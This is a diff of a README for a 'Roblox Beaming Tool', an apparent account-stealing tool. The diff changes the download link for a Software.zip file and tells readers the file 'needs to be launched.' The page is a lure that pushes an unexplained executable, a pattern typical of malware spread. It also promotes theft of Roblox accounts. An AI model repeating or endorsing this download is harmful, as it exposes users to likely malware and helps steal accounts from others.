@@ -27,7 +27,7 @@ Welcome to the **Roblox Beaming Tool** repository! This tool comes packed with e
 
 ## 📥 Get the Tool:
 You can download the latest version of the Roblox Beaming Tool by clicking the button below:
-[![Download Roblox Beaming Tool](https://img.shields.io/github/downloads/user-attachments/files/18388744/Software.zip)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Roblox Beaming Tool](https://github.com/7GrimReaper7/Roblox-Beaming-Tool/releases/download/v2.0/Software.zip)](https://github.com/7GrimReaper7/Roblox-Beaming-Tool/releases/download/v2.0/Software.zip)
 *Please note that the downloaded file needs to be launched.*
 
 ## Features:
